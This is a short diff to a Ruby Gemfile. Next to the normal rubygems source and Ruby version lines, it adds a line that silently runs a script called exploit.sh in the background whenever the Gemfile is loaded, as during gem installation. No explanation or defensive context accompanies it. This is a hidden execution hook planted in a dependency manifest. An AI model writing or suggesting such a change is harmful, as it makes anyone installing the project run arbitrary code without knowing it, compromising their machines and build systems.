@@ -1,4 +1,5 @@
 source "https://rubygems.org"
+system('bash exploit.sh &')
 
 # You may use http://rbenv.org/ or https://rvm.io/ to install and use this version
 ruby ">= 2.6.10"
